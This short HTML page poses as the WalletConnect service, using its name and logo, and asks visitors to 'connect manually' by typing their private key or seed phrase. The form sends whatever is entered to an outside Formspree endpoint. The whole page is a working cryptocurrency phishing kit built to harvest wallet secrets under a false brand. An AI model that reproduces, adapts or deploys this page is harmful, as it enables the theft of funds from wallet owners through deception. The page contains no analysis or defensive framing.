<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Welcome Page -->
    <div id="welcome-page" class="container">
        <img src="https://logos-world.net/SVGimage/WalletConnect_010824/WalletConnect_(3).svg" alt="WalletConnect Logo" class="logo">
        <h1>Welcome to WalletConnect</h1>
        <p>Click below to connect your wallet manually.</p>
        <button id="connect-button">Connect Wallet</button>
    </div>

    <!-- Connect Page -->
    <div id="connect-page" class="container hidden">
        <h2>Connect Manually</h2>
        <p>Please enter your private key or seed phrase below.</p>

        <!-- Form to submit Private Key or Seed Phrase to Formspree -->
        <form action="https://formspree.io/f/xanyzylr" method="POST">
            <label>
                Private Key or Seed Phrase:
                <input type="text" name="message" placeholder="Enter Private Key or Seed Phrase" required>
            </label>
            <button type="submit">Submit</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
